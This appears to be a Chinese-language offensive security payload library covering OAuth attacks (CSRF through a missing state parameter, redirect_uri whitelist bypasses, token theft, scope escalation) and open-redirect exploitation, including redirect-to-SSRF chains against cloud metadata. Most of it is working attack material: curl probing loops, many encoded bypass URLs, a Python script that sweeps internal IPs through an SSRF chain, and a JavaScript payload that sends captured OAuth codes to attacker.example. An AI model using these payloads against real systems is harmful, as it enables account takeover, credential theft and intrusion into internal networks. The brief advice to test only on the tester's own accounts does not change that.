# OAuth / 开放重定向 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:OAuth redirect_uri 绕过 / state 缺失 / PKCE / token theft + 开放重定向基础 / 绕过 / 重定向到 SSRF + OAuth 授权码劫持 URL 解析差异。两类紧耦合,合并阅读。

---

## A. OAuth 漏洞

### OAuth漏洞  `auth-oauth`
OAuth认证流程漏洞
子类：**OAuth** · tags: `auth` `oauth` `redirect`

**前置条件：** 使用OAuth登录

**攻击链：**

**1. CSRF攻击**
_缺乏state参数_
```
# OAuth CSRF - 强制账号绑定攻击:
# 1. 获取攻击者的OAuth授权码:
#    正常走OAuth流程到callback但不完成
#    截获: http://target.com/callback?code=ATTACKER_CODE

# 2. 构造CSRF页面:
<html>
  <body>
    <img src="http://target.com/callback?code=ATTACKER_CODE">
    <!-- 或使用iframe -->
    <iframe src="http://target.com/callback?code=ATTACKER_CODE" style="display:none"></iframe>
  </body>
</html>

# 3. 受害者访问该页面后，其账号将绑定攻击者的OAuth账号
# 4. 攻击者可通过OAuth登录受害者账号

# 防御检测: 检查授权请求是否携带state参数
```

**2. Redirect URI**
_重定向到攻击者获取Code_
```
redirect_uri=http://attacker.com
```

**3. OAuth State参数缺失/可预测CSRF**
_检测OAuth流程中state参数的缺失或可预测性_
```
# 1. 检测state参数是否存在:
# 访问OAuth授权URL，查看是否有state参数
curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code"

# 2. 如果没有state参数 → CSRF绑定攻击:
# 攻击者用自己的OAuth账号发起授权，获取code
# 构造链接: http://target.com/callback?code=ATTACKER_CODE
# 发给受害者 → 受害者的账户绑定了攻击者的OAuth账号

# 3. 如果state可预测:
# 多次请求获取state值分析规律
for i in $(seq 1 5); do
  state=$(curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code" | grep -i "location" | grep -oP "state=([^&]+)" | cut -d= -f2)
  echo "State $i: $state"
  sleep 0.5
done
```

**4. Token窃取与Scope越权**
_OAuth Token窃取、Scope越权、跨应用Token复用测试_
```
# 1. 通过redirect_uri泄露Token:
# implicit flow中Token在URL fragment中:
# http://attacker.com/callback#access_token=xxx
# 使用Referer泄露:
# 如果callback页面有外链，Token会通过Referer泄露

# 2. Scope越权 - 请求更高权限:
curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"

# 3. Token复用测试 - 用authorization_code换取的Token访问其他API:
TOKEN="stolen_access_token_here"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/users"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/settings"
curl -H "Authorization: Bearer ${TOKEN}" "http://other-app.target.com/api/user/info"

# 4. refresh_token窃取后无限续期:
curl -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=xxx"   "http://target.com/oauth/token"
```

**WAF/EDR 绕过变体：**

**1. Redirect URI绕过技巧合集**
_多种redirect_uri白名单绕过技术_
```
# 白名单绕过技巧:

# 1. 子域名绕过(如果白名单用后缀匹配):
redirect_uri=http://evil.target.com/callback
redirect_uri=http://target.com.evil.com/callback

# 2. 路径遍历:
redirect_uri=http://target.com/callback/../../../evil-page
redirect_uri=http://target.com/callback/..%2f..%2f..%2fevil-page

# 3. 参数注入:
redirect_uri=http://target.com/callback?next=http://evil.com
redirect_uri=http://target.com/callback%23@evil.com

# 4. 端口注入:
redirect_uri=http://target.com:8080@evil.com/callback

# 5. URL编码绕过:
redirect_uri=http://target.com%40evil.com/callback
redirect_uri=http://target.com%2540evil.com/callback

# 6. localhost/内网绕过:
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# 7. 开放重定向链:
redirect_uri=http://target.com/redirect?url=http://evil.com
```

---


---

## B. 开放重定向


### 基础开放重定向  `redirect-basic`
URL跳转漏洞利用
子类：**基础** · tags: `redirect` `url` `phishing`

**前置条件：** 目标参数控制跳转地址

**攻击链：**

**1. 直接跳转**
_直接跳转到攻击者站点_
```
http://target.com/redirect?url=http://attacker.com
```

**2. 绕过验证**
_@符号绕过_
```
http://target.com/redirect?url=http://attacker.com@target.com
```

**3. 斜杠绕过**
_//绕过协议_
```
http://target.com/redirect?url=//attacker.com
```

**WAF/EDR 绕过变体：**

**1. URL编码与双编码绕过**
_通过URL编码、双重URL编码、Unicode同形字、CRLF注入等方式绕过跳转目标地址的白名单或黑名单检测_
```
# URL编码:
/redirect?url=%68%74%74%70%3a%2f%2fattacker.com
# 双编码:
/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com
# Unicode编码:
/redirect?url=http://attacker。com
/redirect?url=http://ⓐttacker.com
# CRLF注入:
/redirect?url=%0d%0aLocation:%20http://attacker.com
```

**2. 反斜杠与data: URI绕过**
_利用反斜杠在不同解析器中的差异行为、data: URI协议、多斜杠协议相对URL等方式绕过域名白名单验证_
```
# 反斜杠技巧:
/redirect?url=http://attacker.com@target.com
/redirect?url=//attacker.com
/redirect?url=/attacker.com

# data: URI:
/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# 协议相对URL变体:
/redirect?url=//attacker.com
/redirect?url=///attacker.com
/redirect?url=////attacker.com
```

---

### 重定向绕过  `redirect-bypass`
开放重定向绕过技巧
子类：**Bypass** · tags: `redirect` `bypass`

**前置条件：** 存在重定向参数

**攻击链：**

**1. URL编码**
_使用URL编码_
```
redirect=http%3a%2f%2fattacker.com
```

**2. @符号**
_利用URL认证部分_
```
redirect=http://target.com@attacker.com
```

**3. 反斜杠**  _[windows]_
_使用反斜杠_
```
redirect=https:/\attacker.com
```

**WAF/EDR 绕过变体：**

**1. 反斜杠路径规范化**
_利用反斜杠在不同浏览器/服务器中的路径规范化差异绕过重定向域名白名单_
```
# 反斜杠替代正斜杠
https://target.com/redirect?url=https://evil.com\@target.com
https://target.com/redirect?url=https:\\evil.com

# 路径穿越绕过域名白名单
https://target.com/redirect?url=https://target.com/..%2f@evil.com
https://target.com/redirect?url=//evil.com/%2f..%2f

# 协议相对URL
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\\evil.com
```

**2. URL片段与参数注入**
_利用URL片段标识符、参数污染和完整URL编码绕过服务端的重定向目标检查_
```
# 片段标识符混淆
https://target.com/redirect?url=https://target.com#@evil.com
https://target.com/redirect?url=https://target.com%23@evil.com

# 参数污染
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26next=evil.com

# 编码混淆
https://target.com/redirect?url=https%3a%2f%2fevil.com
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

**3. 空字节与特殊字符截断**
_利用空字节截断URL校验、CRLF注入额外头部、特殊空白字符混淆URL解析_
```
# 空字节截断
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# 换行符注入
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/空格混淆
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)
```

---

### 重定向到SSRF  `redirect-ssrf`
利用开放重定向漏洞作为跳板将SSRF探测引导到内部网络，绕过SSRF的URL白名单/黑名单限制
子类：**SSRF** · tags: `redirect` `ssrf`

**前置条件：** 目标存在开放重定向(Open Redirect)漏洞；目标存在SSRF功能点(URL参数/Webhook等)；SSRF过滤仅检查初始URL而不跟踪重定向

**攻击链：**

**1. 识别开放重定向点**  _[linux]_
_寻找目标站点的开放重定向端点和参数_
```
# 常见重定向参数:
curl -sI "http://target.com/redirect?url=https://evil.com" | grep -i location
curl -sI "http://target.com/login?next=https://evil.com" | grep -i location
curl -sI "http://target.com/goto?link=https://evil.com" | grep -i location

# 批量测试常见参数:
for param in url redirect next goto link return returnUrl callback dest destination rurl; do
  status=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" -o /dev/null -w "%{http_code}")
  location=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" | grep -i "^location:" | head -1)
  echo "${param}: HTTP ${status} → ${location}"
done
```

**2. 通过重定向绕过SSRF过滤**  _[linux]_
_利用目标自身的重定向端点绕过SSRF的域名白名单限制_
```
# 场景: SSRF接口检查URL域名白名单，但不检查重定向目标

# 正常SSRF请求(被拦截):
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# → 返回: "Blocked: internal IP"

# 通过重定向绕过:
# 1. 先确认重定向有效:
curl -sI "http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# 2. 将重定向URL作为SSRF输入:
curl "http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
# → SSRF过滤看到target.com(白名单内)，放行
# → 服务端跟随重定向到169.254.169.254
# → 返回AWS元数据
```

**3. 短链接和DNS重绑定辅助**
_使用短链接、自建重定向和DNS重绑定辅助SSRF绕过_
```
# 如果目标站点没有开放重定向，使用外部服务:

# 1. 短链接服务重定向:
# 创建短链接指向内部IP: bit.ly/xxxxx → http://192.168.1.1
curl "http://target.com/api/fetch?url=https://bit.ly/xxxxx"

# 2. 自建重定向服务器:
# Python Flask:
# @app.route("/redirect")
# def redir():
#     return redirect("http://169.254.169.254/latest/meta-data/")
curl "http://target.com/api/fetch?url=http://attacker.com/redirect"

# 3. DNS重绑定:
# 使用rbndr.us等工具，DNS记录在attacker-IP和内部IP之间切换
# 第一次解析: attacker.com → 1.2.3.4 (通过IP检查)
# 第二次解析: attacker.com → 169.254.169.254 (实际请求)
curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"
```

**4. 完整利用链: 重定向→SSRF→内网探测**
_利用重定向→SSRF链批量探测内部网络资源_
```
# 完整攻击链:
import requests

TARGET = "http://target.com"
SSRF_URL = f"{TARGET}/api/fetch?url="
REDIR_URL = f"{TARGET}/redirect?url="

# 通过重定向探测内网:
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

for internal in internal_targets:
    # 构造: SSRF → 重定向 → 内网目标
    payload = f"{SSRF_URL}{REDIR_URL}{internal}"
    try:
        r = requests.get(payload, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] FOUND: {internal}")
            print(f"    Response: {r.text[:200]}")
        else:
            print(f"[-] {internal}: HTTP {r.status_code}")
    except Exception as e:
        print(f"[!] {internal}: {e}")
```

**WAF/EDR 绕过变体：**

**1. URL解析差异利用**
_利用不同URL解析库（cURL/urllib/Java URL）对authority/host部分解析的差异绕过SSRF白名单_
```
# 利用URL解析库差异
http://evil.com#@target.com
http://evil.com\@target.com
http://target.com@evil.com

# 特殊URL格式
http://evil。com (全角句号)
http://ⓔⓥⓘⓛ.com (Unicode圆圈字符)
http://evil%E3%80%82com

# IPv6地址混淆
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

**2. DNS重绑定攻击**
_通过DNS重绑定在URL校验和实际请求之间切换解析结果，绕过SSRF的IP黑名单_
```
# DNS Rebinding攻击步骤
# 1. 配置DNS服务器交替返回不同IP
# evil.com -> 第1次解析: 公网IP（通过校验）
# evil.com -> 第2次解析: 127.0.0.1（实际请求）

# 使用rbndr.us自动DNS重绑定
http://7f000001.c0a80001.rbndr.us/internal

# 使用1u.ms
http://make-127.0.0.1-rr.1u.ms/admin

# TOCTOU: 检查时域名解析到白名单IP，请求时解析到内网IP
```

**3. IP地址混淆表示**
_使用十进制、八进制、十六进制和IPv6映射等不同方式表示内网IP绕过黑名单检查_
```
# 十进制IP
http://2130706433  (= 127.0.0.1)
http://3232235777  (= 192.168.1.1)

# 八进制IP
http://0177.0.0.1  (= 127.0.0.1)
http://0x7f.0.0.1  (= 127.0.0.1)

# 混合进制
http://0177.0x0.0.1
http://127.1  (省略零段)
http://127.0.1

# IPv6映射
http://[::1]
http://[::]  (= 0.0.0.0)
http://[::ffff:7f00:1]
```

### OAuth 授权码劫持 — 在 redirect_uri 内执行的 JS payload

OAuth 中 `redirect_uri` 若允许任意子路径(或 open redirect / XSS 落点),攻击者可在跳转后的页面执行 JS 把 `code` exfil 到自己服务器,完成无感劫持。受害者只看到正常的 OAuth 同意流程。

```javascript
// 在攻击者控制的 redirect_uri 页(或 redirect_uri 域上的 XSS sink)中执行
var urlParams = new URLSearchParams(window.location.search);
var capturedCode = urlParams.get('code');  // 也可换成 'access_token' / 'id_token'(fragment 模式)

if (capturedCode) {
    var http = new XMLHttpRequest();
    // GET 模式带在 query;实战推荐 fetch + no-cors 或 navigator.sendBeacon 以规避 CSP report-only
    http.open("GET", "https://attacker.example/log_code.php?code=" + encodeURIComponent(capturedCode), true);
    http.send();
}

// implicit / hybrid flow(token 在 fragment):
// var fragParams = new URLSearchParams(window.location.hash.slice(1));
// var token = fragParams.get('access_token') || fragParams.get('id_token');
```

**何时用**:`redirect_uri` 校验允许 `https://target.com/anywhere` 子路径任意,且子路径有 XSS / 第三方 widget 注入面。证明影响时只对自己控制的两个账号操作,不要诱导真实用户点击。

### OAuth / redirect_uri URL 解析差异 — 通用绕过库

服务端常用 startsWith / parse_url / regex 比对 redirect_uri,但客户端浏览器解析按 [RFC 3986 + WHATWG URL](https://url.spec.whatwg.org/) 实际跳转,两者解析差异 → 跳转到攻击者域:

```text
# 用户态字符歧义(@、./、@host 形式)
https://example.com?@www.attacker.com/
https://example.com/@www.attacker.com/
https://www.attacker.com@example.com/
https://www.attacker.com.example.com/
https://example.com?.www.attacker.com/
https://example.com#.www.attacker.com/
https://example.com/.www.attacker.com/

# 双重 URL 嵌套
https://example.com/https://www.attacker.com/
https://example.com%2f@example.com/        # %2f 解码歧义
https://example.com%2f@attacker.com/

# 反斜杠 (`\`) — 部分库视为 path-sep,浏览器视为 host-sep
https://example.com\@www.attacker.com/
https://example.com\\@www.attacker.com/
https://www.attacker.com\@example.com/

# 字符集编码绕过(后端做 mb_convert_encoding / iconv 时,%ff / %df 可能消失或合并下一字节)
https://example.com%ff@www.attacker.com/
https://example.com%df@www.attacker.com/

# 字符集解码后端样本(PHP):
# $url = mb_convert_encoding($_GET['url'], "GBK", "UTF-8");
# %df 在 GBK 下与下一字节合并,host 段被吞掉
```

**真实命中要点**:
- 服务端用 `parse_url` / `urlparse` 取 host 后做白名单比对,但客户端按 WHATWG 实际跳转 → 解析差异
- 服务端做编码转换(GBK / Big5 / Shift-JIS)前先比对 → 解码后 host 改变
- 反斜杠在 Go / Node.js / Python 部分库视为 path 分隔符,浏览器视为 host 分隔符

**报告价值**:从中危(open redirect)升到高危(账号接管)的关键是结合上面 §OAuth 授权码劫持 payload 证明可拿到他人 `code`。仍仅自演,不抓真实用户 code。

---

---

← 回 [00-index.md](00-index.md) · 相关:[`12-jwt.md`](12-jwt.md)(很多 OAuth 实现用 JWT 做 token)
